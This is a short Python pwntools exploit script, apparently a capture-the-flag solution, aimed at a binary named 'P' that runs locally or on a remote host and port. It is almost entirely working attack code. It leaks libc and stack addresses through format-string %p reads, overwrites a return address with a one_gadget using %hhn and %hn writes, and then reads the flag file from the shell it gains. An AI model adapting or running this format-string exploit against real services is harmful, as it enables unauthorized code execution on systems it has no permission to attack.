#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './P'
LIBC = './libc-2.27.so'
HOST = '140.110.112.77'
PORT = 4005

context.binary = BINARY
e = ELF( BINARY )
libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY, env={"LD_PRELOAD": LIBC} )

buf2 = 0x404060
fd = 0x404010
log.info(f"fd: {hex(fd)}")
log.info(f"buf2: {hex(buf2)}")

r.send('%10$p\x00')
libc_base = int(r.recv()[2:], 16) - 0x21b97 # libc_start_main + 231
log.info(f"libc_base: {hex(libc_base)}")
system_addr = libc_base + libc.symbols['system']

r.send('%7$p\x00')
stack = int(r.recv()[2:], 16)
log.info(f"stack: {hex(stack)}") # rsp+7 -> rsp+9 (value)

# rsp + 7 -> rsp + 9 -> addr_want_to_write
# rsp + 9 -> addr_want_to_write -> content
one_gadget = 0x10a38c + libc_base
log.info(f"og: {hex(one_gadget)}")
r.sendline("%{}c%5$hhnQAQ\x00".format(stack+0x08 & 0xff))
r.recvuntil('QAQ')
r.sendline("%{}c%7$hnQAQ\x00".format(one_gadget & 0xffff))
r.recvuntil('QAQ')
one_gadget >>= 16

r.sendline("%{}c%5$hhnQAQ\x00".format(stack+0x8+0x2 & 0xff))
r.recvuntil('QAQ')
r.sendline("%{}c%7$hhnQAQ\x00".format(one_gadget & 0xff))
r.recvuntil('QAQ')

r.sendline('exit')
r.sendline('cat /home/`whoami`/flag')
r.interactive()
